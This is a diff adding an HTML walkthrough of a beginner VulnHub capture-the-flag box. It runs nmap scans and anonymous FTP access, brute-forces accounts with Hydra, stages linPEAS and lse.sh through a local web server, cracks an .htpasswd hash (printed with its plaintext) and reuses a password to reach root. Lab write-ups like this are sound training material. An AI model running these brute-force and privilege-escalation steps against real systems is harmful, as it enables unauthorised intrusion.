@@ -1,0 +1,99 @@
+<h1 id="description"><strong>Description</strong></h1>
+<p>It's a box for beginners and can be pwned in the lunch break. This works better with VirtualBox rather than Vmware.</p>
+<p>Discovering the Target IP address</p>
+<p>┌──(kali㉿kali)-[~/Downloads/vulnhub/FunboxLunchBreaker] └─$ sudo netdiscover -r 192.168.0.100/24</p>
+<p><img src="Images\Screenshot_30.png" alt="Markdown Logo" /></p>
+<h2 id="active-reconnaissance"><strong>Active Reconnaissance</strong></h2>
+<p>Running Nmap scan to discover open ports</p>
+<p>Three ports are open</p>
+<p>PORT STATE SERVICE</p>
+<ul>
+<li>21/tcp open ftp</li>
+<li>22/tcp open ssh</li>
+<li>80/tcp open http</li>
+</ul>
+<p>└─$ <code>sudo nmap -sV -O -A -T4 192.168.0.179</code></p>
+<p><img src="Images\Screenshot_31.png" alt="My Sample Image" /></p>
+<h2 id="ftp-anonymous-login"><strong>FTP Anonymous login</strong></h2>
+<p>Since FTP port is open and it allows anonymous login Login to the FTP server using anonymous as username</p>
+<p><img src="Images\Screenshot_32.png" alt="My Sample Image" /></p>
+<p>Use get command to download both the .s3cr3t and supers3cr3t files to the local host current working directory.</p>
+<p><img src="Images\Screenshot_1.png" alt="My Sample Image" /></p>
+<p>The .s3cr3t file contains base64 encrypted message</p>
+<p>Decrypting the message, we got the plaintext below;</p>
+<p><em><strong>If the radiance of a thousand suns / were to burst at once into the sky / that would be like / the splendor of the Mighty One and I am become Death, the shatterer of worlds</strong></em></p>
+<p><img src="Images\Screenshot_2.png" alt="My Sample Image" /></p>
+<p>Decrypting the message in supers3cr3t file using this url below.</p>
+<p><a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></p>
+<p>We got the plaintext below;</p>
+<p><strong><em>Look deep into nature and then you will understand everything better.</em></strong></p>
+<p><img src="Images\Screenshot_3.png" alt="My Sample Image" /></p>
+<h2 id="enumerate-the-web-server"><strong>Enumerate the web server</strong></h2>
+<p>No vital information was found login anonymously through ftp. Investigate the web server if any vital info could be found.</p>
+<p><img src="Images\Screenshot_4.png" alt="My Sample Image" /></p>
+<p>Check the robots.txt file which tells search engine crawlers which URLs the crawler can access on your site. It says dirb, gobuster tools should be disallowed, these are directory bruteforcing tools.</p>
+<p>And allow WYSIWYG <strong><em>"what you see is what you get"</em></strong></p>
+<p><img src="Images\Screenshot_5.png" alt="My Sample Image" /></p>
+<p>Inspecting the element, possible username was found.</p>
+<p>Possible username (jane) was found on the html comment tag</p>
+<p>webdesign by j.miller [<a href="mailto:jane@funbox8.ctf">jane@funbox8.ctf</a>]</p>
+<p><img src="Images\Screenshot_6.png" alt="My Sample Image" /></p>
+<h2 id="bruteforce-attack"><strong>Bruteforce Attack</strong></h2>
+<p>Possible username jane, trying to get her password Using Hydra command which is a password bruteforce tool with rockyou.txt wordlist The password for jane was found.</p>
+<p>Login to the ftp server using jane credentials.</p>
+<p><img src="Images\Screenshot_7.png" alt="My Sample Image" /></p>
+<p>There is a backups directory, cd to the backup directory. There is a key.txt file in backups directory. Using get command the file was downloaded to the local machine.</p>
+<p><img src="Images\Screenshot_9.png" alt="My Sample Image" /></p>
+<p>The keys.txt file contains encrpted keys. No useful information on how to use the key for authentication.</p>
+<p><img src="Images\Screenshot_10.png" alt="My Sample Image" /></p>
+<p>There is home directory, cd to home. Jane can read other directories in /home Directories of other users were found.</p>
+<p><img src="Images\Screenshot_11.png" alt="My Sample Image" /></p>
+<p>Create a file for the users. Use Hydra command to bruteforce for their possible passwords.</p>
+<p><img src="Images\Screenshot_12.png" alt="My Sample Image" /></p>
+<p>$ <code>hydra -L users.txt -P ~/Downloads/rockyou.txt ftp://192.168.0.179 -t4</code></p>
+<p><img src="Images\Screenshot_13.png" alt="My Sample Image" /></p>
+<p>Login to the ftp server using Jim credentials. List all the directories under Jim ls -al. .ssh directory was checked and no useful information was found.</p>
+<p><img src="Images\Screenshot_14.png" alt="My Sample Image" /></p>
+<p>Login to the ftp server using Jules credentials. cd to the .backups directory</p>
+<p><img src="Images\Screenshot_15.png" alt="My Sample Image" /></p>
+<p>There are wordlist files in the backups directory which might be useful to get the john password. Use mget command to download all the wordlist files to the local machine.</p>
+<p><img src="Images\Screenshot_16.png" alt="My Sample Image" /></p>
+<p>Go to the current working directory on the local machine and list all the files there. The wordlist files are hidden, use -al flag with ls command to list the hidden files.</p>
+<p><img src="Images\Screenshot_17.png" alt="My Sample Image" /></p>
+<p>We need to move the hidden files to the current working directory. Use move command to move the wordlist files to the current working directory.</p>
+<p><img src="Images\Screenshot_18.png" alt="My Sample Image" /></p>
+<p>Reusing Jules' password to ssh into the machine Check if Jules has sudo privilege. Jules does not have sudo privilege.</p>
+<p><img src="Images\Screenshot_19.png" alt="My Sample Image" /></p>
+<p>Linpeas.sh and lse.sh were used to read security information and to search for possible paths to escalate privileges on the target machine.</p>
+<p>Linux smart enumeration is a shell script which will show relevant information about the security of the local Linux system, helping to escalate privileges.</p>
+<p><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
+<p>wget "<a href="https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh">https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh</a>" -O lse.sh;chmod 700 lse.sh</p>
+<p>Linux local Privilege Escalation Awesome Script (linPEAS) is a script that search for possible paths to escalate privileges on Linux/Unix hosts.</p>
+<p>$ wget <a href="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh">https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh</a> -O linpeas.sh</p>
+<p>Copy the lse.sh and linpeas.sh files to the target machine. Start the python http-server.</p>
+<p><img src="Images\Screenshot_20.png" alt="My Sample Image" /></p>
+<p>Use wget command to download the lse.sh and linpeas.sh files from the local machine to the target machine (funbox8)</p>
+<p>wget <a href="http://192.168.0.165/lse.sh">http://192.168.0.165/lse.sh</a></p>
+<p>wget <a href="http://192.168.0.179/linpeas.sh">http://192.168.0.179/linpeas.sh</a></p>
+<p>Change the mode bits of the .sh files using chmod command.</p>
+<p>chmod +x *.sh</p>
+<p><img src="Images\Screenshot_21.png" alt="My Sample Image" /></p>
+<p>From the local machine, you can see the two files being sent to the remote machine.</p>
+<p><img src="Images\Screenshot_22.png" alt="My Sample Image" /></p>
+<p>Run the lse.sh to see all the vital information about the security of the machine. ./lse.sh -l 1 -i |more</p>
+<p>John has root privilege.</p>
+<p><img src="Images\Screenshot_23.png" alt="My Sample Image" /></p>
+<p>John password hash was found.</p>
+<p><img src="Images\Screenshot_24.png" alt="My Sample Image" /></p>
+<p>Copy the hash</p>
+<p>Cat /srv/ftp/wordpress/wp-blog/.htpasswd</p>
+<p>john:$apr1$2gymw37l$w604wlgyqqNeOgNac.1qT/</p>
+<p><img src="Images\Screenshot_25.png" alt="My Sample Image" /></p>
+<p>Create a file for the hash; john2hash</p>
+<p><img src="Images\Screenshot_26.png" alt="My Sample Image" /></p>
+<p>Use john the ripper command with the wordlists to find plaintext of the hash Bad.passwd wordlist worked. zhnmju!!!</p>
+<p><img src="Images\Screenshot_27.png" alt="My Sample Image" /></p>
+<p>Since John's password is known, switch user to John. There is a todo.list file in todo directory which list all the tasks John intend to perform. One of the task says change ROOTPASSWD, because it is the same right now. This implies John is still using his account password for root password too.</p>
+<p><img src="Images\Screenshot_28.png" alt="My Sample Image" /></p>
+<p>Switch user to root and enter john's password as the password. We are at the root now. There is a root.flag file, open the file to read its content using cat command.</p>
+<p><img src="Images\Screenshot_29.png" alt="My Sample Image" /></p>
